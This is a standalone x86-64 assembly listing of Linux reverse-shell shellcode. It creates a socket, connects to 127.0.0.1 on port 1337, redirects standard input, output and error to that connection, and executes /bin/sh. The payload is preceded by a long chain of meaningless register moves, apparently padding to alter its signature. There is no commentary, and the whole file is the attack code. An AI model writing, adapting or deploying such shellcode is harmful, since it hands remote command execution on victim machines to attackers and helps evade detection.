BITS 64
global _start

section .text
_start: 
XOR r14,r14
MOV r9,r14
MOV r10,r9
MOV r10,r10
MOV r10,r10
MOV r12,r10
MOV r12,r12
MOV r14,r12
MOV r8,r14
MOV r15,r8
MOV r15,r15
MOV r14,r15
MOV r12,r14
MOV r10,r12
MOV r14,r10
MOV r10,r14
MOV r14,r10
MOV r9,r14
MOV r9,r9
MOV r14,r9
MOV r12,r14
MOV r8,r12
MOV r15,r8
MOV r14,r15
MOV r14,r14
MOV r10,r14
MOV r12,r10
MOV r10,r12
MOV r9,r10
MOV r12,r9
MOV r8,r12
MOV r9,r8
MOV r12,r9
MOV r14,r12
MOV r8,r14
MOV r9,r8
MOV r14,r9
MOV r9,r14
MOV r10,r9
MOV r9,r10
MOV r15,r9
MOV r10,r15
MOV r12,r10
MOV r12,r12
MOV r12,r12
MOV r10,r12
MOV r14,r10
MOV rax,r14
xor rdi,rdi
xor rsi,rsi
xor rdx,rdx
xor rdx,rdx
mov sil,0x01
mov dil,0x02
mov al,0x29
syscall
mov dil,al
xor r11,r11
push 0x0100007f
push word 0x3905
push word 0x2
mov rsi,rsp
mov dl,0x10
mov al,0x2a
syscall
xor r11,r11
mov dil,0x03
mov rsi,r11
mov al,0x21
syscall
xor r11,r11
mov dil,0x03
mov sil,0x01
mov al,0x21
syscall;
xor r11,r11
mov dil,0x03
mov sil,0x02
mov al,0x21
syscall;
xor rax,rax
xor rdi,rdi
xor rsi,rsi
xor r13,r13
mov al,59
mov rdi,"/bin/sh"
push r13
push rdi
mov rdi,rsp
push r13
push rdi
mov rsi,rsp
xor rdx,rdx
syscall
